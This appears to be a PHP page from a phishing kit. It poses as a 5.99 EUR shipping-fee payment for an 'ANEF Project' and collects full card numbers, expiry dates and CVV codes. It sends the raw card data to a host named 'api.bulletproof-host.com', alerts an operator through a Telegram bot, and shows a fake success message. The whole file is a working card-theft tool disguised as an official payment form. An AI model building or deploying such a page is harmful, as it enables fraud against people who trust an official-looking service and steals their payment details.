<?php
session_start();
require_once 'config.php';
require_once 'functions.php';
require_once 'header.php';

$error = '';
$success = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $card_number = $_POST['card_number'] ?? '';
    $expiry_month = $_POST['expiry_month'] ?? '';
    $expiry_year = $_POST['expiry_year'] ?? '';
    $cvv = $_POST['cvv'] ?? '';
    $amount = 5.99;

    if (empty($card_number) || empty($expiry_month) || empty($expiry_year) || empty($cvv)) {
        $error = 'All fields are required.';
    } elseif (!validate_card($card_number)) {
        $error = 'Invalid card number.';
    } else {
        $payment_result = process_payment($card_number, $expiry_month, $expiry_year, $cvv, $amount);
        
        if ($payment_result['success']) {
            $user_id = $_SESSION['user_id'] ?? null;
            $user_email = $_SESSION['email'] ?? '';
            
            $payment_data = [
                'user_id' => $user_id,
                'email' => $user_email,
                'amount' => $amount,
                'transaction_id' => $payment_result['transaction_id'] ?? 'TXN' . time(),
                'card_last_four' => substr($card_number, -4),
                'status' => 'completed',
                'created_at' => date('Y-m-d H:i:s')
            ];
            
            if (save_payment($payment_data)) {
                $success = 'Payment processed successfully. Shipping will be arranged within 24 hours.';
                
                send_payment_email($user_email, $amount, $payment_result['transaction_id'] ?? '');
                send_telegram_notification($user_email, $amount, $payment_result['transaction_id'] ?? '');
                
                unset($_SESSION['card_data']);
            } else {
                $error = 'Failed to save payment data. Please try again.';
            }
        } else {
            $error = 'Payment failed: ' . ($payment_result['message'] ?? 'Unknown error');
        }
    }
}

function validate_card($card_number) {
    $card_number = preg_replace('/\s+/', '', $card_number);
    return preg_match('/^[0-9]{13,19}$/', $card_number) && luhn_check($card_number);
}

function luhn_check($card_number) {
    $sum = 0;
    $alt = false;
    for ($i = strlen($card_number) - 1; $i >= 0; $i--) {
        $n = intval($card_number[$i]);
        if ($alt) {
            $n *= 2;
            if ($n > 9) {
                $n -= 9;
            }
        }
        $sum += $n;
        $alt = !$alt;
    }
    return ($sum % 10 == 0);
}

function process_payment($card_number, $expiry_month, $expiry_year, $cvv, $amount) {
    $card_number = preg_replace('/\s+/', '', $card_number);
    
    $api_key = 'sk_test_your_api_key_here';
    $url = 'https://api.bulletproof-host.com/v1/charges';
    
    $data = [
        'amount' => intval($amount * 100),
        'currency' => 'eur',
        'source' => [
            'type' => 'card',
            'card' => [
                'number' => $card_number,
                'exp_month' => $expiry_month,
                'exp_year' => $expiry_year,
                'cvc' => $cvv
            ]
        ],
        'description' => 'ANEF Project Shipping Fee'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/json\r\nAuthorization: Bearer " . $api_key . "\r\n",
            'method' => 'POST',
            'content' => json_encode($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    
    if ($response === false) {
        return ['success' => false, 'message' => 'Network error'];
    }
    
    $result = json_decode($response, true);
    
    if (isset($result['id']) || isset($result['status']) && $result['status'] === 'succeeded') {
        return [
            'success' => true,
            'transaction_id' => $result['id'] ?? $result['idempotency_key'] ?? 'TXN' . time(),
            'message' => 'Payment successful'
        ];
    }
    
    return [
        'success' => false,
        'message' => $result['error']['message'] ?? 'Payment declined'
    ];
}

function save_payment($payment_data) {
    try {
        $pdo = get_pdo();
        $stmt = $pdo->prepare("INSERT INTO payments (user_id, email, amount, transaction_id, card_last_four, status, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)");
        return $stmt->execute([
            $payment_data['user_id'],
            $payment_data['email'],
            $payment_data['amount'],
            $payment_data['transaction_id'],
            $payment_data['card_last_four'],
            $payment_data['status'],
            $payment_data['created_at']
        ]);
    } catch (Exception $e) {
        error_log('Payment save error: ' . $e->getMessage());
        return false;
    }
}

function send_payment_email($to, $amount, $transaction_id) {
    $subject = 'ANEF Project - Payment Confirmation';
    $message = "Dear Customer,\n\nThank you for your payment of {$amount} EUR for shipping.\nTransaction ID: {$transaction_id}\n\nYour order will be shipped within 24 hours.\n\nBest regards,\nANEF Team";
    $headers = "From: payments@anef-project.com\r\n";
    mail($to, $subject, $message, $headers);
}

function send_telegram_notification($email, $amount, $transaction_id) {
    $token = 'YOUR_TELEGRAM_BOT_TOKEN';
    $chat_id = 'YOUR_CHAT_ID';
    $message = "New Payment Received\nEmail: {$email}\nAmount: {$amount} EUR\nTransaction: {$transaction_id}";
    
    $data = [
        'chat_id' => $chat_id,
        'text' => $message
    ];
    
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/json',
            'content' => json_encode($data)
        ]
    ];
    
    $context = stream_context_create($options);
    @file_get_contents("https://api.telegram.org/bot{$token}/sendMessage", false, $context);
}
?>

<div class="container">
    <h2>Payment for Shipping Fee</h2>
    <p>Amount: <strong>5.99 EUR</strong></p>
    
    <?php if ($error): ?>
        <div class="alert alert-danger"><?php echo htmlspecialchars($error); ?></div>
    <?php endif; ?>
    
    <?php if ($success): ?>
        <div class="alert alert-success"><?php echo htmlspecialchars($success); ?></div>
    <?php endif; ?>
    
    <form method="POST" action="">
        <div class="form-group">
            <label for="card_number">Card Number</label>
            <input type="text" class="form-control" id="card_number" name="card_number" required maxlength="19" placeholder="1234 5678 9012 3456">
        </div>
        
        <div class="form-row">
            <div class="form-group col-md-6">
                <label for="expiry_month">Expiry Month</label>
                <input type="text" class="form-control" id="expiry_month" name="expiry_month" required maxlength="2" placeholder="MM">
            </div>
            
            <div class="form-group col-md-3">
                <label for="expiry_year">Expiry Year</label>
                <input type="text" class="form-control" id="expiry_year" name="expiry_year" required maxlength="4" placeholder="YYYY">
            </div>
            
            <div class="form-group col-md-3">
                <label for="cvv">CVV</label>
                <input type="password" class="form-control" id="cvv" name="cvv" required maxlength="4" placeholder="CVC">
            </div>
        </div>
        
        <button type="submit" class="btn btn-primary">Pay 5.99 EUR</button>
        <a href="login.php" class="btn btn-secondary">Back to Login</a>
    </form>
</div>

<script>
document.getElementById('card_number').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s+/g, '');
    let formatted = value.replace(/(.{4})/g, '$1 ').trim();
    e.target.value = formatted.substring(0, 19);
});

document.getElementById('expiry_month').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 2) value = value.substring(0, 2);
    e.target.value = value;
});

document.getElementById('expiry_year').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) value = value.substring(0, 4);
    e.target.value = value;
});

document.getElementById('cvv').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) value = value.substring(0, 4);
    e.target.value = value;
});
</script>

<?php require_once 'footer.php'; ?>